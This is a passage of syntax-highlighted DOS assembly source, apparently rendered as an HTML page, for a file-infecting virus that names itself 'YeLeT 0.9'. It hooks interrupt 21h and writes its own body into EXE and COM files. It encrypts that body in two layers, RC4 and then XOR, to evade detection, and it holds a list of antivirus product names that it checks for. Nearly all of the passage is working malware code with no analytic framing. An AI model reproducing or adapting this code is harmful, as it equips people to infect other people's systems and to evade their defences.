  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                        </span><span class="sc1">; close it!</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">; restore attribs in CX</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                            </span><span class="sc1">; restore the filename</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                            </span><span class="sc1">; restore DS</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                           </span><span class="sc1">; set attributes (CX on filename at DS:DX)</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; restore the original crittical error handler</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; DS = AX = 0 (= Interrupt Vector Table)</span><span class="sc0">

  </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">original_int_24h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ES:DX = dword ptr cs:[original_int_24h]</span><span class="sc0">

  </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">; disable ints</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; save the old address</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; enable ints again</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                            </span><span class="sc1">; restore ES and</span><span class="sc0">
  </span><span class="sc6">popa</span><span class="sc0">                              </span><span class="sc1">; the registers.</span><span class="sc0">


 </span><span class="sc5">restore</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; restore the original interrupt call</span><span class="sc0">
  </span><span class="sc6">popf</span><span class="sc0">                              </span><span class="sc1">; pop flags</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                            </span><span class="sc1">; and JuMP FAR to</span><span class="sc0">
 </span><span class="sc5">original_int_21h</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; the real address of int21h</span><span class="sc0">
        
 </span><span class="sc5">encrypt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                       </span><span class="sc1">; used to encrypt the virus code</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">                         </span><span class="sc1">; fill the rc4key with 42 'random' bytes.</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">rc4key</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc5">rc4_key_loopy</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rc4_key_loopy</span><span class="sc0">

  </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                         
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xor_value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; get a new 'random' key into xor_value</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; copy the whole virus code to the_end</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">the_end</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">                         </span><span class="sc1">; encrypt the 1st layer using RC4</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rc4expandkey</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">the_end</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rc4_crypt_start</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rc4_crypt_start</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rc4crypt</span><span class="sc0">


  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">the_end</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; encrypt the 2nd layer using XOR</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xor_crypt_start</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                        
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">xor_crypt_start</span><span class="sc0">  
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">xor_value</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; set xor_value (decryption key) to zero</span><span class="sc0">
                                    </span><span class="sc1">; (for bruteforce cracking)</span><span class="sc0">

  </span><span class="sc6">ret</span><span class="sc0">                               </span><span class="sc1">; return</span><span class="sc0">
 </span><span class="sc5">encrypt</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

 </span><span class="sc5">append</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">; write the first, unencrypted part of the</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; virus into the file. (start till</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">xor_crypt_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">        </span><span class="sc1">; xor_crypt_start)</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                        </span><span class="sc1">; write the encrypted part into the file,</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">the_end</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; beginning at the_end</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xor_crypt_start</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">the_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">xor_crypt_start</span><span class="sc0">  </span><span class="sc1">; the_end - xor_crypt_start bytes.</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">                               </span><span class="sc1">; return</span><span class="sc0">
 </span><span class="sc5">append</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

 </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'?'</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; buffer for exe header and com stuff</span><span class="sc0">
 </span><span class="sc5">old_ip</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_exe</span><span class="sc0">          </span><span class="sc1">; buffer for the original IP</span><span class="sc0">
 </span><span class="sc5">old_cs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; CS</span><span class="sc0">
 </span><span class="sc5">old_sp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0fffeh</span><span class="sc0">                   </span><span class="sc1">; SP</span><span class="sc0">
 </span><span class="sc5">old_ss</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; SS</span><span class="sc0">
 </span><span class="sc5">new_jump</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; buffer used by com infection to</span><span class="sc0">
 </span><span class="sc5">original_3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">; calculate a new jump</span><span class="sc0">
                                    
 </span><span class="sc5">message1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'YeLeT 0.9, just another bug in your Micro$oft System...'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

 </span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">; buffer for the filesize [optimization</span><span class="sc0">
                                    </span><span class="sc1">; needed! ;]</span><span class="sc0">
 </span><span class="sc5">wincom</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c:\windows\win.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">avs</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'scavtbf-fi'</span><span class="sc0">                </span><span class="sc1">; anti virus programs we are checking for</span><span class="sc0">
                                    </span><span class="sc1">; SCan, AVp, TBav (and co.), F-prot and</span><span class="sc0">
                                    </span><span class="sc1">; FIndviru</span><span class="sc0">
 </span><span class="sc5">state</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">exe</span><span class="sc0">                       </span><span class="sc1">; represents the current filetype</span><span class="sc0">
 </span><span class="sc5">archiver</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">off</span><span class="sc0">
 </span><span class="sc5">enuns</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                  </span><span class="sc1">; buffer for win95's ENUNS</span><span class="sc0">

 </span><span class="sc5">the_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
